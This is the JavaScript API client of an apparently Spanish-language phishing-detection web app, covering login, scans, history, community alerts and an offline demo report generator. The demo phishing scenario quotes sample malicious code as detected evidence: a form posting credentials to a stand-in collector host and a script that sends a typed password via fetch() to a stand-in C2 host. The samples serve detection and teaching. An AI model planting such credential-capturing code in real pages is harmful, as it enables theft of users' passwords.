const DEFAULT_API_BASE = '/api/v1';

function resolveApiBase() {
  const saved = localStorage.getItem('d360_api_base');
  if (saved) return saved.replace(/\/+$/, '');
  return DEFAULT_API_BASE;
}

async function sha256HexBrowser(text) {
  const bytes = new TextEncoder().encode(text);
  const digest = await crypto.subtle.digest('SHA-256', bytes);
  return Array.from(new Uint8Array(digest))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
}

export class ApiClientError extends Error {
  constructor(status, code, message, details = null, retryAfter = null) {
    super(message);
    this.name = 'ApiClientError';
    this.status = status;
    this.code = code;
    this.details = details;
    this.retryAfter = retryAfter;
  }
}

export const ApiClient = {
  async request(path, options = {}, allowRefreshRetry = true) {
    const method = (options.method || 'GET').toUpperCase();
    const headers = {
      Accept: 'application/json',
      ...(options.headers || {})
    };

    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(method)) {
      headers['X-Requested-With'] = 'Detector360-PWA';
      if (options.body !== undefined) {
        headers['Content-Type'] = 'application/json';
      }
    }

    const fetchOptions = {
      method,
      headers,
      credentials: 'include'
    };

    if (options.body !== undefined) {
      fetchOptions.body = JSON.stringify(options.body);
    }

    const endpoint = `${resolveApiBase()}${path}`;
    let response;
    try {
      response = await fetch(endpoint, fetchOptions);
    } catch {
      throw new ApiClientError(
        0,
        'NETWORK_UNAVAILABLE',
        'No se pudo conectar con el motor de análisis. Verifica tu conexión a internet o que el Worker esté en ejecución.'
      );
    }

    // Transparent JWT Access Token refresh on 401
    if (
      response.status === 401 &&
      allowRefreshRetry &&
      !path.startsWith('/auth/login') &&
      !path.startsWith('/auth/register') &&
      !path.startsWith('/auth/refresh')
    ) {
      const refreshed = await this.tryRefreshSession();
      if (refreshed) {
        return this.request(path, options, false);
      }
    }

    let payload = null;
    try {
      payload = await response.json();
    } catch {
      throw new ApiClientError(
        response.status,
        'NON_JSON_RESPONSE',
        'El servidor devolvió una respuesta no estructurada. Asegúrate de que Cloudflare Worker esté activo en /api/v1.'
      );
    }

    if (!response.ok || payload?.success === false) {
      const errObj = payload?.error || {};
      throw new ApiClientError(
        response.status,
        errObj.code || 'API_ERROR',
        errObj.message || 'Ocurrió un error al procesar la solicitud',
        errObj.details || null,
        errObj.retry_after_seconds || null
      );
    }

    return payload;
  },

  async tryRefreshSession() {
    try {
      const res = await fetch(`${resolveApiBase()}/auth/refresh`, {
        method: 'POST',
        credentials: 'include',
        headers: {
          Accept: 'application/json',
          'X-Requested-With': 'Detector360-PWA'
        }
      });
      return res.ok;
    } catch {
      return false;
    }
  },

  // Auth endpoints
  getMe() {
    return this.request('/auth/me');
  },

  register(alias, email, password) {
    return this.request('/auth/register', {
      method: 'POST',
      body: { alias, email, password }
    });
  },

  login(email, password, rememberMe = true) {
    return this.request('/auth/login', {
      method: 'POST',
      body: { email, password, remember_me: rememberMe }
    });
  },

  logout() {
    return this.request('/auth/logout', { method: 'POST', body: {} });
  },

  // Forensic scan endpoints
  createScan({ url, forceRefresh = false, saveSnapshot = false, userAgentProfile = 'mobile_android', caseNote = '' }) {
    return this.request('/scans', {
      method: 'POST',
      body: {
        url,
        force_refresh: forceRefresh,
        save_snapshot: saveSnapshot,
        user_agent_profile: userAgentProfile,
        case_note: caseNote
      }
    });
  },

  getScanById(scanId) {
    return this.request(`/scans/${encodeURIComponent(scanId)}`);
  },

  getHistory({ page = 1, limit = 20, riskLevel = '', search = '' } = {}) {
    const params = new URLSearchParams({
      page: String(page),
      limit: String(limit)
    });
    if (riskLevel) params.set('risk_level', riskLevel);
    if (search) params.set('search', search);
    return this.request(`/scans/history?${params.toString()}`);
  },

  deleteScan(scanId) {
    return this.request(`/scans/${encodeURIComponent(scanId)}`, {
      method: 'DELETE'
    });
  },

  // Community alerts
  getCommunityAlerts(limit = 6) {
    return this.request(`/community/alerts?limit=${limit}`);
  },

  publishCommunityAlert({ scanId, channelReceived, citizenNote }) {
    return this.request('/community/alerts', {
      method: 'POST',
      body: {
        scan_id: scanId,
        channel_received: channelReceived,
        citizen_note: citizenNote
      }
    });
  },

  /**
   * Generates a cryptographically signed local forensic demonstration scenario
   * (Clearly marked as Corpus Local de Prueba) so users can inspect the Forensic Viewer,
   * SHA-256 verification, and PDF/JSON exports even offline or prior to Worker deployment.
   */
  async buildLocalSimulationReport(scenarioKey) {
    const nowIso = new Date().toISOString().replace(/\.\d{3}Z$/, 'Z');
    const scenarios = {
      critical_phishing: {
        scan_id: 'scn_01J9X9DEMO00000000CRITICAL',
        target_url: 'http://verificacion-cuenta-segura.ejemplo.net/login',
        final_url: 'http://verificacion-cuenta-segura.ejemplo.net/login',
        target_domain: 'verificacion-cuenta-segura.ejemplo.net',
        protocol: 'http',
        is_https: false,
        http_status_code: 200,
        redirect_count: 1,
        redirect_chain: [
          {
            step: 1,
            from_url: 'http://acortador-promo.xyz/bono',
            to_url: 'http://verificacion-cuenta-segura.ejemplo.net/login',
            status_code: 302
          }
        ],
        security_headers: {
          strict_transport_security: false,
          content_security_policy: false,
          x_frame_options: false
        },
        risk_score: 94,
        risk_level: 'CRITICAL',
        citizen_verdict: {
          title: 'PELIGRO CRÍTICO: No ingreses tus datos en esta página',
          summary:
            'Se detectó que el sitio captura contraseñas sin cifrado HTTPS, envía el formulario a un servidor externo (recolector-datos.xyz) y ejecuta scripts ocultos de exfiltración.'
        },
        findings: [
          {
            id: 'fnd_demo_01',
            rule_code: 'INSECURE_HTTP_SENSITIVE_FORM',
            category: 'DOM_FORM',
            severity: 'CRITICAL',
            line_number: 48,
            column_number: 5,
            dom_selector: 'form#auth-login',
            citizen_explanation:
              'Este formulario pide tu contraseña sobre una conexión HTTP sin cifrar; cualquier persona en la misma red Wi-Fi puede interceptarla.',
            technical_detail:
              'Etiqueta <form> con <input type="password"> servida bajo esquema http:// y action sin TLS.',
            code_snippet:
              '<form id="auth-login" action="http://recolector-datos.xyz/capture.php" method="POST">'
          },
          {
            id: 'fnd_demo_02',
            rule_code: 'CROSS_DOMAIN_FORM_ACTION',
            category: 'DOM_FORM',
            severity: 'CRITICAL',
            line_number: 48,
            column_number: 5,
            dom_selector: 'form#auth-login',
            citizen_explanation:
              'Los datos que escribas aquí se envían directamente a otro sitio web externo (recolector-datos.xyz) distinto al dominio actual.',
            technical_detail:
              "Origen 'verificacion-cuenta-segura.ejemplo.net' difiere del destino 'recolector-datos.xyz'.",
            code_snippet:
              '<form id="auth-login" action="http://recolector-datos.xyz/capture.php" method="POST">'
          },
          {
            id: 'fnd_demo_03',
            rule_code: 'UNMASKED_PASSWORD_INPUT',
            category: 'DOM_INPUT',
            severity: 'HIGH',
            line_number: 51,
            column_number: 7,
            dom_selector: 'form#auth-login > input#pin_cajero',
            citizen_explanation:
              'El campo de PIN o código de tarjeta usa texto abierto (type="text") sin ocultar los dígitos.',
            technical_detail:
              'Campo sensible detectado con type="text" e id="pin_cajero" sin enmascaramiento.',
            code_snippet:
              '<input type="text" id="pin_cajero" name="pin_clave" placeholder="PIN de 4 dígitos" required>'
          },
          {
            id: 'fnd_demo_04',
            rule_code: 'JS_ASYNC_EXFILTRATION',
            category: 'JS_SCRIPT',
            severity: 'CRITICAL',
            line_number: 89,
            column_number: 9,
            dom_selector: 'script:nth-of-type(2)',
            citizen_explanation:
              'Un script oculto captura lo que escribes en los campos antes de que presiones el botón enviar.',
            technical_detail:
              "Listener 'blur' sobre input#clave combinado con fetch() hacia host externo c2-log.xyz.",
            code_snippet:
              "document.getElementById('clave').addEventListener('blur', e => fetch('https://c2-log.xyz/k?v=' + btoa(e.target.value)));"
          }
        ],
        source_preview: [
          { line: 46, content: '<main class="portal-bancario">', has_finding: false },
          { line: 47, content: '  <div class="login-box">', has_finding: false },
          {
            line: 48,
            content: '    <form id="auth-login" action="http://recolector-datos.xyz/capture.php" method="POST">',
            has_finding: true,
            rule_codes: ['INSECURE_HTTP_SENSITIVE_FORM', 'CROSS_DOMAIN_FORM_ACTION']
          },
          {
            line: 49,
            content: '      <input type="text" name="usuario" placeholder="Cédula o Usuario" required>',
            has_finding: false
          },
          {
            line: 50,
            content: '      <input type="password" id="clave" name="clave" placeholder="Contraseña" required>',
            has_finding: true,
            rule_codes: ['PLAINTEXT_PASSWORD_FIELD']
          },
          {
            line: 51,
            content: '      <input type="text" id="pin_cajero" name="pin_clave" placeholder="PIN de 4 dígitos" required>',
            has_finding: true,
            rule_codes: ['UNMASKED_PASSWORD_INPUT']
          },
          { line: 52, content: '    </form>', has_finding: false },
          { line: 88, content: '  <script>', has_finding: false },
          {
            line: 89,
            content:
              "    document.getElementById('clave').addEventListener('blur', e => fetch('https://c2-log.xyz/k?v=' + btoa(e.target.value)));",
            has_finding: true,
            rule_codes: ['JS_ASYNC_EXFILTRATION']
          },
          { line: 90, content: '  </script>', has_finding: false }
        ]
      },
      safe_portal: {
        scan_id: 'scn_01J9X9DEMO00000000SAFE0001',
        target_url: 'https://portal-ciudadano-oficial.gob.ejemplo/consulta',
        final_url: 'https://portal-ciudadano-oficial.gob.ejemplo/consulta',
        target_domain: 'portal-ciudadano-oficial.gob.ejemplo',
        protocol: 'https',
        is_https: true,
        http_status_code: 200,
        redirect_count: 0,
        redirect_chain: [],
        security_headers: {
          strict_transport_security: true,
          content_security_policy: true,
          x_frame_options: true
        },
        risk_score: 0,
        risk_level: 'SAFE',
        citizen_verdict: {
          title: 'SITIO SEGURO: Transporte cifrado y sin rastros de exfiltración',
          summary:
            'La conexión utiliza cifrado HTTPS válido con cabeceras HSTS/CSP activas y no se detectaron formularios externos ni scripts sospechosos.'
        },
        findings: [],
        source_preview: [
          { line: 1, content: '<!DOCTYPE html>', has_finding: false },
          { line: 2, content: '<html lang="es">', has_finding: false },
          { line: 12, content: '  <form id="consulta-tramite" action="/api/tramites" method="POST">', has_finding: false },
          { line: 13, content: '    <input type="text" name="radicado" placeholder="Número de trámite">', has_finding: false },
          { line: 14, content: '  </form>', has_finding: false }
        ]
      }
    };

    const chosen = scenarios[scenarioKey] || scenarios.critical_phishing;
    const evidencePayload = {
      scan_id: chosen.scan_id,
      target_url: chosen.target_url,
      final_url: chosen.final_url,
      target_domain: chosen.target_domain,
      scanned_at: nowIso,
      protocol: chosen.protocol,
      http_status_code: chosen.http_status_code,
      redirect_count: chosen.redirect_count,
      security_headers: chosen.security_headers,
      risk_score: chosen.risk_score,
      risk_level: chosen.risk_level,
      findings: chosen.findings.map((f) => ({
        rule_code: f.rule_code,
        category: f.category,
        severity: f.severity,
        line_number: f.line_number,
        column_number: f.column_number,
        dom_selector: f.dom_selector,
        code_snippet: f.code_snippet
      }))
    };

    const integritySha256 = await sha256HexBrowser(JSON.stringify(evidencePayload));

    return {
      scan_id: chosen.scan_id,
      target_url: chosen.target_url,
      final_url: chosen.final_url,
      target_domain: chosen.target_domain,
      scanned_at: nowIso,
      duration_ms: 412,
      risk_score: chosen.risk_score,
      risk_level: chosen.risk_level,
      citizen_verdict: chosen.citizen_verdict,
      transport_audit: {
        protocol: chosen.protocol,
        is_https: chosen.is_https,
        http_status_code: chosen.http_status_code,
        redirect_count: chosen.redirect_count,
        redirect_chain: chosen.redirect_chain,
        tls_verified: chosen.is_https,
        content_type: 'text/html; charset=utf-8',
        response_bytes: 4096,
        security_headers: chosen.security_headers
      },
      findings: chosen.findings,
      source_preview: chosen.source_preview,
      is_demo_simulation: true,
      evidence_payload: evidencePayload,
      integrity_sha256: integritySha256
    };
  }
};
